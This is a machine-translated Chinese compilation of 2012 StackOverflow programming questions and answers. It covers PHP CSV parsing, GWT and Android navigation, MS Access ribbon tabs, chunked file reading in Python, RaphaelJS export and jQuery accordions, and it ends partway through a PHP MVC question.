# StackOverflow 问答 11091000-11091999

# php - CSV 文件读取失败 (PHP )

> ID：11091002
> 
> 赞同：0
> 
> 时间：2012-06-18T21:03:19.820
> 
> 标签：php, csv

我正在尝试读取 CSV 文件（以逗号分隔），但不幸的是，它没有按应有的方式响应。我不太确定我在这里做错了什么，但我会粘贴代码和 CSV 文件的内容：

```
$row = 0;
if($handle = fopen("SampleQuizData.csv","r") !== FALSE)
{
    // WORKS UNTIL HERE, SO FILE IS BEING READ
    while(!feof(handle))
    {
        $line = fgetcsv($handle, 1024, ",") ;
        echo $line[2];  // DOES NOT WORK
    }    
} 
```

这是 CSV 文件：（此处更改了电子邮件和名称以保护用户的身份）

```
parijat,something,parijatYkalia@hotmail.com
matthew,durp, mdurpdurp@gmail.com
steve,vai,stevevai@gmail.com
rajni,kanth,rajnikanth@superman.com 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:09:57.437

它缺少句柄变量的“$”

```
while(!feof($handle)){ 
```

并不是 ：

```
while(!feof(handle)){ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T22:10:14.523

**试试这个：**

```
<?php

$row = 0;

if (($handle = fopen("SampleQuizData.csv", "r")) !== FALSE)
{
    while(!feof($handle))
    {
        $line = fgetcsv($handle, 1024, ",") ;
        echo "$line[2]";
    }    
}

?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-18T21:13:51.303

值得一提的是，当我几周前处理 CSV 导出时，我遇到了奇怪的行尾不一致。所以我把它放在我的 php 文件的顶部，它工作得很好。

```
<?php
    ini_set("auto_detect_line_endings", true);
?> 
```

# android - 意图的 GWT 等价物

> ID：11091007
> 
> 赞同：-1
> 
> 时间：2012-06-18T21:03:49.187
> 
> 标签：android, gwt

我刚开始使用来自 Android 编程的 Google Web Toolkit。因为它都是 java(ish) 我希望它是相似的。在我的应用程序中，我有一个入口点，用户将在其中上传一个 excel 文件并点击提交。在他们点击提交后，他们应该被带到一个新页面，我将在其中显示他们刚刚上传的 Excel 中的一些信息。

在 Android 中，它看起来像

```
 myAndroidBTN.setOnClickListener (new OnClickListener() {
        public void onClick(View v) { 
            try { 
               final Intent myIntent = new Intent(this, NextClass.class)); 
               startActivity(myIntent); 
       } catch (Exception e) { }       
        } 
```

在 GWT 应用程序中，我有

```
Button btnSubmit = new Button("Submit");
    btnSubmit.addClickHandler(new ClickHandler() {
        public void onClick(ClickEvent event) { 
        }
    }); 
```

GWT 的文档似乎与 android 的文档相差无几，因此我找不到打开新 java 文件的正确方法。这应该怎么做？

**编辑** 你们中的一些人误解了我的问题。我不想暗示我可以在带有 GWT 的浏览器中构建相当于一个 android 应用程序，我只是想看到相当于一个 OnClick 事件将您带到一个新页面/部分。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-19T00:50:24.403

查看活动和地点。

[https://developers.google.com/web-toolkit/doc/latest/DevGuideMvpActivitiesAndPlaces](https://developers.google.com/web-toolkit/doc/latest/DevGuideMvpActivitiesAndPlaces)

# php - 使用 MySQL 的 Android ListView 可点击项目

> ID：11091018
> 
> 赞同：0
> 
> 时间：2012-06-18T21:04:24.193
> 
> 标签：php, android, mysql, listview

这是我的场景：

我有两个 MySQL 表：

类别（列：id、category） 项目（列：id、item、category_id）

安卓部分：

我有一个应用程序，它打开一个从名为“类别”的表填充的 ListView。它做得很好。我想要做的是使 ListView 中的每个类别项目都可点击以打开一个新的 ListView，其中填充了“Items”表中的项目（其中每个 getPosition() = category_Id）。

我可以通过 PHP 查询找出最后一点。我不确定如何使 Android 部分工作。我是否重复使用相同的 ListView？每次点击都会打开一个新活动吗？

有人可以给我看一个非常简单的例子（即使是伪代码）这是如何工作的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:15:57.573

```
listView.setOnItemClickListener(new OnItemClickListener() {

        @Override
        public void onItemClick(AdapterView<?> arg0, View arg1, int arg2, long id) {

            String category = YOUR_ArrayList.get((int) id);
            Bundle d = new Bundle();
            d.putString("category", category);
                            Intent itemIntent = new Intent(this, ItemActivity.class);
            prodottiIntent.putExtras(d);
            startActivity(itemIntent);
        }
    }); 
```

现在在您的 itemActivity 中，您应该只使用 bundle d（类别）

```
 Bundle d = getIntent().getExtras();
    String category = d.getString("category"); 
```

现在使用您的字符串“类别”，您可以在数据库中搜索并显示所有具有您按下的类别的项目

# debugging - 如何在 Monodroid 中调试引用的项目？

> ID：11091020
> 
> 赞同：0
> 
> 时间：2012-06-18T21:04:27.843
> 
> 标签：debugging, xamarin.android

我正在使用 Visual Studio 2010 开发 monodroid。

我有一个 .net 库，其中包含业务逻辑和我的 monodroid 应用程序。在 monodroid 应用程序中，我使用业务逻辑库。（添加参考...）当我调试知道并想要进入进入库的方法调用时，调试器会跳过该步骤，然后我继续使用 monodroid 应用程序。

有人知道解决方案吗？像这样真的很难发展……

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T23:12:49.507

如果您只是引用一个 DLL，Visual Studio 通常不知道在哪里可以找到它的源代码，并且 VS 没有内置反编译器。因此您将需要 Reflector 之类的东西或将项目与业务逻辑链接进入解决方案并在您正在调试的项目中使用项目引用。

# jquery - 用于多个页面的 iosSlider

> ID：11091024
> 
> 赞同：1
> 
> 时间：2012-06-18T21:04:40.293
> 
> 标签：jquery, jquery-plugins, swipe

我正在尝试将[iosSlider](http://iosscripts.com/iosslider-jquery-horizontal-slider-for-iphone-ipad-safari/)用于多个页面。例如，从`page1.html`到`page2.html`到`page3.html`，等等。该示例仅显示了如何从一个 div 转到另一个（我猜 DIV 有图像或文本）。有谁知道如何操纵它来拉出一个新的 html 页面？

这是 iosSlider 页面上的代码：

**jQuery：**

```
<!-- jQuery library -->
<script type = 'text/javascript' src = '/iosSlider/jquery-1.7.min.js'></script>

<!-- iosSlider plugin -->
<script type = 'text/javascript' src = '/iosSlider/jquery.iosslider.js'></script> 
```

**HTML：**

```
<!-- slider container -->
<div class = 'iosSlider'>

    <!-- slider -->
    <div class = 'slider'>

        <!-- slides -->
        <div class = 'slide'>...</div>
        <div class = 'slide'>...</div>
        <div class = 'slide'>...</div>

    </div>

</div> 
```

**CSS：**

```
/* slider container */
.iosSlider {
    /* required */
    position: relative;
    top: 0;
    left: 0;
    overflow: hidden;

    width: <slider width>px;
    height: <slider height>px;
}

/* slider */
.iosSlider .slider {
    /* required */
    width: 100%;
    height: 100%;
}

/* slide */
.iosSlider .slider .slide {
    /* required */
    float: left;

    width: <slide width>px;
    height: <slide height>px;
} 
```

**JavaScript：**

```
$(document).ready(function() {

    /* basic - default settings */
    $('.iosSlider').iosSlider();

    /* some custom settings */
    $('.iosSlider').iosSlider({
        snapToChildren: true,
        scrollbar: true,
        scrollbarHide: false,
        desktopClickDrag: true,
        scrollbarLocation: 'bottom',
        scrollbarHeight: '6px',
        scrollbarBackground: 'url(_img/some-img.png) repeat 0 0',
        scrollbarBorder: '1px solid #000',
        scrollbarMargin: '0 30px 16px 30px',
        scrollbarOpacity: '0.75',
        onSlideChange: changeSlideIdentifier
    });

}); 
```

*或者，如果您知道另一个插件或代码可以从一个页面滑动到下一个页面，我也会接受这个答案。*

谢谢！

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-10-26T13:43:35.133

还没有可用的代码。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-04T12:56:16.540

好吧，您可以使用 iosSlider 附带的全屏示例。如果您愿意将整个页面放在 div 中，它会做您想做的事。

# ms-access - 使用自定义功能区时，是否可以防止 MS Access 自动更改所选功能区选项卡？

> ID：11091025
> 
> 赞同：6
> 
> 时间：2012-06-18T21:04:44.340
> 
> 标签：ms-access, vba, ribbon, office-2010

当自定义 UI XML 文件用于在 Access 中添加多个自定义功能区选项卡时，只要关闭表单，选定的功能区选项卡就会变回第一个自定义选项卡。

我们以编程方式从 VBA 加载自定义功能区。我创建[了一个重现问题的 accdb](http://sdrv.ms/LX5ioI)。该文件夹还包括一个包含功能区定义的 XML 文件。它必须与 .accdb 文件位于同一目录中。

这个问题很容易证明：

1.  打开数据库 RibbonTest.accdb，
2.  切换到 Tab2 并使用功能区上的按钮打开 Form2，然后
3.  关闭 Form2。

请注意，Tab1 现在处于活动状态。

当然，在这个小例子 db 中，这个问题似乎很小。但是，我们有一个非常大的项目，其中包含许多自定义选项卡，每个选项卡都包含许多组和按钮。我们的用户确实感到非常沮丧，因为他们每次关闭表单时都会在功能区上丢失自己的位置。

我们研究了一种解决方法，我们以编程方式存储选定的选项卡并在我们认为需要时恢复它。然而，事实证明很难可靠地做到这一点。（没有像这样自动化功能区的 Office API，但[这篇文章有所帮助](http://blogs.msdn.com/b/pranavwagh/archive/2008/01/21/how-to-switch-ribbon-tab-programmatically-looks-simple.aspx)。）

有没有其他人遇到过这个问题？您是否找到了防止选项卡自动更改的方法？

**编辑：**似乎这个问题是在 Office 2010 **SP1**中实施的修复程序中引入的。（对不起，没有链接：不要认为我可以有两个以上。） RTM 版本中不存在该问题。SP1 的修复列表包括：“当用户返回到该对象时，Access 不会激活或返回用户到先前打开的数据库对象的正确功能区选项卡。” 似乎他们已尝试修复 Form.RibbonName 属性（支持上下文功能区）的使用，但在此过程中破坏了默认功能区。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-09-20T03:18:30.523

这一行解决了这个问题：

`<tab id="tabBogus" label="Bogus" visible="false"></tab>`

只需将其设为`<tabs>`. 非常感谢斯科特的潜在解决方法答案！（试图投票和/或评论，但只是注册所以没有足够的声誉。）与其他复杂的解决方法相比，这节省了数小时（或数天）的工作！谢谢！

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-08-19T21:33:18.380

# 潜在的解决方法

我偶然发现对我有用的是使用可见标记隐藏 XML 中的第一个选项卡。我没有对其进行太多测试，但我有一个隐藏的标准主页选项卡的副本（不知道它是否需要成为填充选项卡）。在我看来，由于 Access 在您关闭表单时实际上无法激活隐藏选项卡，因此它仍保留在当前选定的选项卡上。

我不知道这是否已在 Access 2013 中修复，但希望这些信息对某人有用还为时不晚。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-21T14:33:13.317

# 这是一个错误！

MS 支持已为此接受了一个错误提交，并评论了 Office 2010 SP1，“实施的更改允许我们使用选项卡的 TCID 跟踪每个数据库对象（表单、报告等）的活动选项卡，以便在您移动在对象之间恢复活动选项卡。但是自定义选项卡都使用相同的 TCID 值，因此通过此更改*，自定义选项卡的活动选项卡将始终移动到第一个自定义选项卡。* "

我们希望他们将来会发布一个修补程序来解决这个问题。

# 解决方法

以下信息已证明对我们创建解决方法很有用。

1.  请参阅上面 Johanness 关于[IRibbonUI.ActivateTab](http://msdn.microsoft.com/en-us/library/microsoft.office.core.iribbonui.activatetab)方法的答案。这是在 Office 2010 中引入的。
2.  没有用于获取当前选定选项卡的 Office API (AFAIK)。因此，我们使用[本文中](http://www.wordarticles.com/Shorts/RibbonVBA/RibbonVBADemo.php)的代码很有帮助。我们
    *   当我们生成包含`id`每个功能区选项卡值的功能区时创建一个数组，
    *   处理`Form_Deactivate`并使用它以另一种隐藏形式启动计时器，并存储所选选项卡的索引，
    *   在`Timer_Tick`隐藏形式的处理程序中，我们禁用计时器并查找`id`我们存储索引的选项卡的值`Form_Deactivate`，并且
    *   [使用IRibbonUI.ActivateTab](http://msdn.microsoft.com/en-us/library/microsoft.office.core.iribbonui.activatetab)激活选项卡。
3.  [本文](http://www.rondebruin.nl/hidevisible.htm)展示了一个有趣的[IRibbonUI.Invalidate](http://msdn.microsoft.com/en-us/library/microsoft.office.core.iribbonui.invalidate)用法和`getVisible`选择特定选项卡的回调。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-04-07T21:00:30.013

在与您的功能区选项卡编号相对应的通用代码模块中创建一个枚举器变量 (ALT+Y)

```
' Used By Send Keys to Select Correct Ribbon Tab.
Enum eRibTabs
    DataEntry = 1
    Reporting = 2
    StockAndParts = 3
    AdminFinance = 4
    DataImport = 5
    OtherAdmin = 6
    Admin = 7
    LocalSystem = 8
End Enum 
```

在 ms Access 中创建一个名为“zFrmRibbonSelect”的表单，并放置一个名为 txtTabValue 的未绑定文本框，然后将以下代码放入您的新表单中。（建议将表单模式设置为隐藏。

```
Private Sub Form_Current()
' Select Correct Tab Menu Item
Me.txtTabValue = Me.OpenArgs

End Sub

Private Sub Form_Close()
'Select Correct Tab Menu Item
Dim varTab As Variant

varTab = Me.txtTabValue

SendKeys "%Y" & varTab
SendKeys "{ESC}"
SendKeys "{ESC}"

End Sub

Private Sub Form_Timer()
DoCmd.Close acForm, Me.Name, acSaveNo
End Sub 
```

将表单计时器间隔设置为 500，并检查属性框中计时器显示的事件等。

在您的报告中输入以下代码：（使用您想要的枚举器值。）

```
Private Sub Report_Close()
'Select Correct Tab Menu Item
 DoCmd.OpenForm "zFrmRibbonSelect", , , , , acHidden, eRibTabs.StockAndParts
End Sub 
```

对于关闭的表单，请在表单中使用以下代码

```
Private Sub Form_Close()
'Select Correct Tab Menu Item
    SendKeys "%Y" & eRibTabs.StockAndParts
    SendKeys "{ESC}"
    SendKeys "{ESC}"
End Sub 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-06-19T10:05:32.463

似乎有一种方法可以获取选定的选项卡（正如您所提到的，并且可能已经有了代码，并且您可以在[此处](http://www.wordarticles.com/Shorts/RibbonVBA/RibbonVBADemo.php "这里")找到）

在 RibbonCode 模块中：将ribbonObject 保存到模块变量中：在 xml 中更改第一行：

```
<customUI xmlns="http://schemas.microsoft.com/office/2006/01/customui" onload="OnRibbonLoad" > 
```

并添加：

```
Private MyRibbon as IRibbonUI
Private ActiveRibbonTab as string

Sub OnRibbonLoad(ribbon As IRibbonUI)
  Set MyRibbon = ribbon
End Sub

Sub RememberRibbonTab
  ActiveRibbonTab=<Do the IAccessibleMagic here>   
End

Sub RecallActiveTab
  If ActiveRibbonTab<>"" then MyRibbon.ActivateTab(ActiveRibbonTab)
  ActiveRibbonTab=""
End 
```

现在在每种形式中添加

```
Private Sub Form_Close()
  Remember_RibbonTab
End Sub

Private Sub Form_GotFocus()
  RecallActiveTab
End Sub 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-06-19T20:44:33.140

实际上，一种行之有效的方法是减少或消除您打开的表单中的选项卡。如果您指定功能区（属性表中的其他选项卡），那么当您在表单之间切换时，功能区显示的切换会自动且无需代码。

现在虽然这并不是真正解决您的问题的方法，但这里的想法和概念是，如果您必须开始编写一堆代码来参与并切换到哪个选项卡，那么正如您所指出的那样，这真的变得很困难。

如 Access/office 2010 所述，您可以使用代码设置活动选项卡（此功能在 Access/office 2007 中不可用）。

因此，我在这里的唯一建议是尽可能尝试将大多数表单限制为一个选项卡。另一个提示是，虽然在菜单中可能按“任务类型”分组，因此您可能有一个级联到一大堆报告的菜单。现在在处理发票时使用功能区，那么您有：

```
Create invoice
Balance invoice
Post invoice
Print invoice (a report). 
```

因此，上述所有选项都是不同的东西，但都集中在一个功能区中，让您可以完成一项工作。

因此，这里的想法是不按选项类型（例如所有报告）对功能区选项进行分组，而是根据执行一项任务（包括用户在给定时间对给定任务所需的选项）进行分组 + 创建功能区。

如前所述，以上可能无法解决您的问题，但通常避免使用其他选项卡可以解决很多此类问题。

# python - 有没有办法从 python 文件中读取 10000 行？

> ID：11091029
> 
> 赞同：13
> 
> 时间：2012-06-18T21:05:02.223
> 
> 标签：python

我在 python 方面相对较新，在 C 上工作了很多。由于我在 python 中看到了很多我不知道的新函数，我想知道是否有一个函数可以从 python 中的文件中请求 10000 行。

如果存在这种功能，我期望这样的事情：

```
lines = get_10000_lines(file_pointer) 
```

python是否有内置函数，或者我可以为此下载任何模块？如果没有，我该如何做到这一点是最简单的方法。我需要分析一个巨大的文件，所以我想读取 10000 行并每次分析以节省内存。

感谢您的帮助！

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-06-18T21:12:31.103

> f.readlines() 返回一个包含文件中所有数据行的列表。如果给定一个可选参数 sizehint，它会从文件中读取那么多字节以及足够多的字节来完成一行，并从中返回这些行。这通常用于允许有效地逐行读取大文件，但不必将整个文件加载到内存中。只会返回完整的行。

从[文档](http://docs.python.org/tutorial/inputoutput.html#reading-and-writing-files)。

这不完全是您所要求的，因为这限制了读取的字节而不是读取的行，但我认为这是您想要做的。

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2012-06-18T21:12:55.617

```
from itertools import islice

with open(filename) as f:
    first10000 = islice(f, 10000) 
```

这设置`first10000`为一个可迭代的对象，即您可以使用

```
for x in first10000:
    do_something_with(x) 
```

如果您需要列表，请`list(islice(f, 10000))`改为这样做。

当文件包含少于 10k 行时，这将只返回文件中的所有行，没有填充（与`range`基于 - 的解决方案不同）。以块的形式读取文件时，EOF 会通过结果中的 <10000 行发出信号：

```
with open(filename) as f:
    while True:
        next10k = list(islice(f, 10000))  # need list to do len, 3 lines down
        for ln in next10k:
            process(ln)
        if len(next10k) < 10000:
            break 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-06-18T21:08:58.573

你真的在乎你一次有多少行吗？逐行迭代文件对象通常是最有意义的：

```
f = open('myfile.txt', 'r')
for line in f:
    print line 
```

python 文档表明这是处理文件的首选方法：

> 读取行的另一种方法是遍历文件对象。这是内存效率高，速度快，并导致更简单的代码。

有关示例，请参阅[python 文档](http://docs.python.org/tutorial/inputoutput.html#methods-of-file-objects)。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-06-18T21:10:16.713

只需打开文件并告诉 Python 读取一行 10,000 次。

```
lines = None
with open('<filename>') as file:
    lines = (file.readline() for i in range(10000)) 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-06-18T21:19:10.527

您*确定*文件太大而无法存储吗？

由于函数调用有开销（即调用同一个函数 10000 次很慢）并且内存很便宜，我建议一次读取所有行，然后切片到结果列表中。如果您想稍后处理下一个 10000，这肯定是最快的方法——它们会立即为您准备好。

```
with open("filename") as f:
    lines = f.readlines()

indices = range(0, len(lines), 10000) + [len(lines)]
for start, stop in zip(indices, indices[1:]):
    do_stuff_with(lines[start:stop]) 
```

当然，如果文件不适合空闲内存，那么这将不起作用。如果是这样，我会选择[ChipJust 的回答](https://stackoverflow.com/a/11091136/566644)。你甚至可以使用`readlines`sizehint创建一个寻找目标的函数，如果这很重要的话，它会在恰好 10000 行上“归位” [`tell`](http://docs.python.org/library/stdtypes.html#file.tell)。[`seek`](http://docs.python.org/library/stdtypes.html#file.seek)

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2012-06-18T21:19:22.663

```
f = open('myfile.txt', 'r')
while True:
    bytes_lines = f.readlines(10000) # read no more than 10000 bytes
    if not bytes_lines: break # stop looping if no lines read
    for line in bytes_lines:
        text = line.decode("knownencoding") # text will be a unicode object 
```

一次阅读大量文本然后处理它会更快。这会读取大量文本，然后为您将其分成几行。这节省了读取。它也只会给你完整的线条，所以你不需要处理加入线条的存根。

请对此进行测试以确保从文件末尾读取文件不会引发异常。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2012-06-18T21:22:08.953

没有任何功能可以随心所欲地工作。你可以很容易地写一个，但你可能不会更好。例如，如果您获得此处显示的许多解决方案的行列表，那么您必须单独分析每一行：

```
def get_10000_lines(f):
    while True:
        chunk = list(itertools.islice(f, 10000))
        if not chunk:
            break
        yield chunk 
```

如果这样做，您不妨一次读取一行文件，然后分析每个字符串。文件 I/O 无论如何都会被缓冲：

```
for line in f:
    analyze_the_line(line) 
```

如果您想要一个包含 10,000 行的字符串，那么您将单独阅读每一行并将它们连接在一起：

```
for chunk in get_10000_lines(f):
    str_10k = "".join(chunk)
    analyze_a_bunch(str_10k) 
```

现在您正在做很多工作来分配和连接字符串，这可能不值得。

最好是如果您可以对部分行进行分析，那么您可以只读取 1Mb 块中的文件：

```
while True:
    chunk = f.read(1000000)
    if not chunk:
        break
    analyze_a_bunch(chunk) 
```

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2012-06-18T21:56:00.617

从[其他几个](https://stackoverflow.com/a/11091284/577088) [解决方案](https://stackoverflow.com/a/11091142/577088)中汲取灵感，但增加了一个转折......

```
>>> with open('lines.txt', 'r') as lines:
...     chunks = iter(lambda: list(itertools.islice(lines, 7)), [])
...     for chunk in chunks:
...         print chunk
... 
['0\n', '1\n', '2\n', '3\n', '4\n', '5\n', '6\n']
['7\n', '8\n', '9\n', '10\n', '11\n', '12\n', '13\n']
['14\n', '15\n', '16\n', '17\n', '18\n', '19\n', '20\n']
['21\n', '22\n', '23\n', '24\n', '25\n', '26\n', '27\n']
['28\n', '29\n', '30\n', '31\n', '32\n', '33\n', '34\n']
['35\n', '36\n', '37\n', '38\n', '39\n', '40\n', '41\n']
['42\n', '43\n', '44\n', '45\n', '46\n', '47\n', '48\n']
['49\n', '50\n', '51\n', '52\n', '53\n', '54\n', '55\n']
['56\n', '57\n', '58\n', '59\n', '60\n', '61\n', '62\n']
['63\n', '64\n', '65\n', '66\n', '67\n', '68\n', '69\n']
['70\n', '71\n', '72\n', '73\n', '74\n', '75\n', '76\n']
['77\n', '78\n', '79\n', '80\n', '81\n', '82\n', '83\n']
['84\n', '85\n', '86\n', '87\n', '88\n', '89\n', '90\n']
['91\n', '92\n', '93\n', '94\n', '95\n', '96\n', '97\n']
['98\n', '99\n'] 
```

但在这里我必须承认，正如其他人所说，使用`readlines`字节提示会快一点，只要你不需要*正好*10000 行（或每次 10000 行）。但是，我不相信这是因为它的读取次数较少。文档字符串说“`readlines`反复调用 readline() 并返回如此读取的行列表”。所以我认为速度增益来自于减少少量的迭代器开销。定义（使用 Marcin 的代码）：

```
def do_nothing_islice(filename, nlines):
    with open(filename, 'r') as lines:
        chunks = iter(lambda: list(itertools.islice(lines, nlines)), [])
        for chunk in chunks:
            chunk

def do_nothing_readlines(filename, nbytes):
    with open(filename, 'r') as lines:
        while True:
            bytes_lines = lines.readlines(nbytes)
            if not bytes_lines:
                break
            bytes_lines 
```

测试：

```
>>> %timeit do_nothing_islice('lines.txt', 1000)
10 loops, best of 3: 63.6 ms per loop
>>> %timeit do_nothing_readlines('lines.txt', 7000) # 7-byte lines, ish
10 loops, best of 3: 56.8 ms per loop
>>> %timeit do_nothing_islice('lines.txt', 10000)
10 loops, best of 3: 58.4 ms per loop
>>> %timeit do_nothing_readlines('lines.txt', 70000) # 7-byte lines, ish
10 loops, best of 3: 50.7 ms per loop
>>> %timeit do_nothing_islice('lines.txt', 100000)
10 loops, best of 3: 76.1 ms per loop
>>> %timeit do_nothing_readlines('lines.txt', 700000) # 7-byte lines, ish
10 loops, best of 3: 70.1 ms per loop 
```

在平均行长为 7（0 -> 1000000 逐行打印）的文件上，使用`readlines`大小提示会快一点。但只有一点。还要注意奇怪的缩放——我不明白那里发生了什么。

# php - 将 raphaeljs 导出为带有路径背景作为图像的 jpg 时出错

> ID：11091032
> 
> 赞同：10
> 
> 时间：2012-06-18T21:05:35.597
> 
> 标签：php, javascript, svg, raphael

我对 raphaeljs 导出插件（[https://github.com/ElbertF/Raphael.Export](https://github.com/ElbertF/Raphael.Export)）有疑问。在路径元素中，我使用属性`fill`并作为来源，我提供了一个图像 url 来填充。但是当我将它导出到 SVG 时，我看到了一个路径元素定义，但是当我将它导出到 PNG 时，我再也看不到了。

因此，在我的应用程序中，我添加了一个`attr`to`path`元素，如下所示：

```
paper.path("M 195 10 L 300  L 195 z").attr({'stroke-width': 0,'fill': 'url(images/alfen/02/murek.png)'}); 
```

我用这个导出`paper.toSVG()`

在我的 SVG 中，我找到了一条路径：

```
<path transform="matrix(1,0,0,1,0,0)" fill="url(images/alfen/02/murek.png)" stroke="#000" d="M203,183.94389438943895L948,183.94389438943895L948,195L203,195Z" stroke-width="0"></path> 
```

但是当我将其转换为 PNG 时：

```
<?php 
    $json        = $_POST['json'];
    $output      = str_replace('\"','"',$json);
    $filenameSVG = 'test';

    file_put_contents("$filenameSVG.svg", $output);

    $konwert = "convert $filenameSVG.svg $filenameSVG.jpg";

    system($konwert); 
```

我找不到符合我背景的这条道路。有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-04-13T16:44:28.697

如果您能够获得正确的 svg 输出，但无法在 php 中转换为 png，那么您需要检查几件事。

*   作为健全性检查，确保您的 $_POST['json'] 没有返回格式错误的 json
*   你的 php 中的下一行让我感到困惑：`$output = str_replace('\"','"',$json);`
*   可能是您返回的 json 是单个对象，但我仍然不确定您为什么要搜索整个文件而不是寻找特定的嵌套对象`$output = str_replace('\"','"',$json['filename_and_path']);`，如果您返回的 json 是单行，那么可能是处理它的更好方法——即将它作为字符串发布，甚至用数组和索引返回每个字符串。

对于这些东西：

```
$konwert = "convert $filenameSVG.svg $filenameSVG.jpg";
system($konwert); 
```

您可能没有`system()`在字符串中输入有效变量。为了确保我建议正确连接字符串，例如：

```
$konwert = "convert".$filenameSVG.".svg ".$filenameSVG.".jpg"; 
```

您还需要服务器上文件的绝对文件路径来执行命令，否则它将找不到该文件。`$konwert = "convert".$filenameSVG.".svg ".$filenameSVG.".jpg";`如果这两个文件位于项目的根目录中，则代码显然只对您有用。

我也不认为你应该`system()`在这种情况下使用。我的理解是您应该`passthru()`用于处理图像二进制文件。还有`exec()`，但实际上，我认为您需要的是`passthru()`. 见：[http ://www.php.net/manual/en/function.passthru.php](http://www.php.net/manual/en/function.passthru.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-16T16:38:19.027

看起来您的路径只是为图像设置一个容器。你不能使用：

```
paper.image('images/alfen/02/murek.png', 50, 50, 300, 195); 
```

似乎它可能更可靠。您可以使用它作为您的启动器并添加您喜欢的路径。我在使用图像作为填充时遇到了问题，因为它们似乎从未渲染到我期望的位置。

你仍然可以使用：`paper.toSVG()`

我能够毫无问题地转换该版本。

# jquery - 调整 Accordion 以允许隐藏当前内容

> ID：11091041
> 
> 赞同：1
> 
> 时间：2012-06-18T21:06:06.420
> 
> 标签：jquery, accordion, jquery-ui-accordion

我有一个自定义手风琴脚本，我正在尝试适应另一个站点。打开后我需要能够关闭`div`它，但我不知道如何修改它。

这是我的脚本：

```
$(".accordionHidden").hide();

// Bind to Button click Event //
$("a.accordionHeading").bind("click", function(e){
    e.preventDefault();

    // Set New Target from Button data-target Attribute //
    var $target = $("."+$(this).data("target"));

    // Prevent Slide Up / Down of Current Content //
    if ($(".accordionHidden:visible").get(0) != $target.get(0)){

        // Slide Up Content if Visible //
        if ($(".accordionHidden:visible").length){
            $(".accordionHidden").filter(":visible").slideUp("fast", function(){
                $target.slideDown("fast");
            });
        }
        else {
            $target.slideDown("fast");
        }
    }
}); 
```

我还需要能够同时打开多个项目，目前不确定这个脚本是否可以做到这一点。

DEMO： http: [//jsfiddle.net/7W2je/2/](http://jsfiddle.net/7W2je/2/)（添加了第二个手风琴，需要同时打开两个（或更多））

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:33:11.923

尝试`slideToggle()`方法：

```
$(".accordionHidden").hide();

// Bind to Button click Event //
$("a.accordionHeading").bind("click", function(e){
    e.preventDefault();

    // Set New Target from Button data-target Attribute //
    $("."+$(this).data("target")).slideToggle();
    if ($("a.accordionHeading").text() == 'Maximize') {
       $("a.accordionHeading").text("Show Less Info");
       $("a.accordionHeading").removeClass("minimize").addClass('maximize');
    } else {
        $("a.accordionHeading").addClass("minimize").removeClass('maximize').text('Maximize');
    }

}); 
```

[http://jsfiddle.net/7W2je/4/](http://jsfiddle.net/7W2je/4/)

# java - 在 Mallet 中更改目标字母：字母不匹配

> ID：11091043
> 
> 赞同：0
> 
> 时间：2012-06-18T21:06:22.320
> 
> 标签：java, nlp, mallet

我很难从 Mallet 开发人员列表中获得帮助，所以我在这里尝试。

我有一个 InstancesList，其目标字母表为 {A, B, C}，我需要将目标字母表更改为 {A, NOT_A} 以进行另一次分析。

到目前为止，我有以下代码（改编自其他 Mallet 源代码），但我不断得到：

字母不匹配：Instance: [5976, null], InstanceList: [5976, 2]

```
...
InstanceList iListCopy = (InstanceList) instances.clone();

Alphabet blank = new Alphabet();
Alphabet newAlpha = new Alphabet();

//A and NOT_A cannot be found in alphabet, so add them.
newAlpha.lookupIndex("A", true);
newAlpha.lookupIndex("NOT_A", true);

Noop pipe = new Noop(blank, newAlpha);
InstanceList newIList = new InstanceList(pipe);

//iterate through each instance and change the target based on the
original value.
for (int i = 0; i < iListCopy.size(); i++) {
   Instance inst = iListCopy.get(i);

   FeatureVector original = (FeatureVector) inst.getData();
   Instance newInst = pipe.instanceFrom(new Instance(original,
newAlpha, inst.getName(), inst.getSource()));
   if (inst.getLabeling().toString().equals("A") {  
       newInst.setTarget("A");
   } else {
       newInst.setTarget("NOT_A");
   }
   newIList.add(newInst);   //FAILS with "Alphabets do not match."
}
... 
```

有人对我如何将目标字母表从 {A, B, C} 更改为 {A, NOT_A} 有任何建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T14:25:54.423

目标应该是一个标签。尝试这个：

```
..
newInst.setTarget(((LabelAlphabet) newList.getTargetAlphabet()).lookupLabel("A"));
..
newInst.setTarget(((LabelAlphabet) newList.getTargetAlphabet()).lookupLabel("NOT_A")); 
```

# php - 从函数 php 将对象作为类属性返回

> ID：11091044
> 
> 赞同：1
> 
> 时间：2012-06-18T21:06:32.597
> 
> 标签：php, model-view-controller

我正在制作一个 MVC 应用程序。我在我的加载器类中创建了这个函数：

```
public function load_models($model)
{
    if ($model) {
        set_include_path($this->modelDirectoryPath);
        spl_autoload_extensions('.php');
        spl_autoload($model);   
    }
} 
```

我正在使用我的控制器中的这个功能，如下所示：

```
$this->load->load_models('news'); 
```

我想像这样访问这个模型类：

```
$this->load->news->get_article(); 
```

